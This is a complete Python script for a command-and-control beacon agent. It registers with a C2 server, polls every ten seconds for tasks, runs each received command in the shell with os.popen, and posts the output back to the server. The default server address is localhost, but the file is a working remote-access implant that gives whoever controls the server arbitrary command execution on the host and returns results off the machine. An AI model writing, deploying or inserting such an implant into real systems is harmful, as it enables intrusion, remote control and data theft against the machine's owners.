import os
import time
import requests
import socket
import json

def run_beacon(c2_url="http://127.0.0.1:5000"):
    hostname = socket.gethostname()

    # 1. Register
    try:
        r = requests.post(f"{c2_url}/register", json={"hostname": hostname})
        agent_id = r.json().get("agent_id")
        print(f"[+] Registered as agent ID {agent_id}")
    except Exception as e:
        print(f"[-] Registration failed: {e}")
        return

    # 2. Start polling loop
    try:
        while True:
            print("[*] Polling for task...")
            task_resp = requests.get(f"{c2_url}/task", params={"id": agent_id})
            task = task_resp.json()
            command = task.get("command")
            task_id = task.get("task_id")

            if command and command != "noop":
                print(f"[C2] Task received: {command}")
                try:
                    output = os.popen(command).read()
                except Exception as e:
                    output = str(e)

                print(f"[=] Sending result back for task {task_id}")
                requests.post(f"{c2_url}/result", json={
                    "task_id": task_id,
                    "output": output
                })
            else:
                print("[*] No task available.")

            time.sleep(10)
    except KeyboardInterrupt:
        print("[!] Beacon stopped.")
